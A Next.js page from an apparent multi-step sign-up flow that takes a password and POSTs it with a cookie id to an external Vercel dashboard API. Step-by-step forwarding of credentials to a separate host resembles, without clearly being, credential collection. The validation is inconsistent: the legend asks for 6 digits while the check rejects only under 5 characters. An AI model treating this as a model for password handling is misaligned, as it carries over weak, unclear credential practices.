import FormContainer from '@/app/(components)/FormContainer'
import Navbar from '@/app/(components)/Navbar'
import StateBar from '@/app/(components)/stateBar'
import React from 'react'
import {redirect} from "next/navigation"
import { cookies } from 'next/headers'
 async function formActionPassword( inital , formData) {
  "use server"
  const cookieStore = cookies();
  const idObj = cookieStore.get('id')

  const id = idObj.value;
  console.log("Id trouvé" , id)
    const  password= await formData.get("password");
    if((password.length < 5 )) {
      return redirect('/email?message=to Short');
    }
    const body = {
      id : id,
      password : password
    }
    try {
    
    
    const res = await fetch("https://dash-r8v62i99s-kybytos-projects.vercel.app/api/password", {
      method: 'POST', // Specify the request method
      headers: {
        'Content-Type': 'application/json' // Specify the content type of the request body
      },
      body: JSON.stringify(body) // Convert the data object to a JSON string
    });
    
    console.log("Status Password api :",res.status);
    }
    catch(err) {
      console.log("Error occured in the post request of password : \n" ,err);
    }
    
    return redirect("/name");

    }
export default function page() {
  return (
    <div className='flex-col flex items-center  ' >
        <Navbar className={`flex gap-[5%]  items-center lg:text-[22px] w-[100%] `} imageClassName='hidden sm:block'>
            <StateBar width="25%"  /> 
        </Navbar>
        <FormContainer buttonText='Next' legend='It must contain at least 6 digits ' Header='Enter your password'
         className=''formAction={formActionPassword} >
        <input className="border border-black p-3 rounded-lg w-[100%] h-[100%] " type="password" name='password'/>

            </FormContainer>
        
    </div>
  )
}
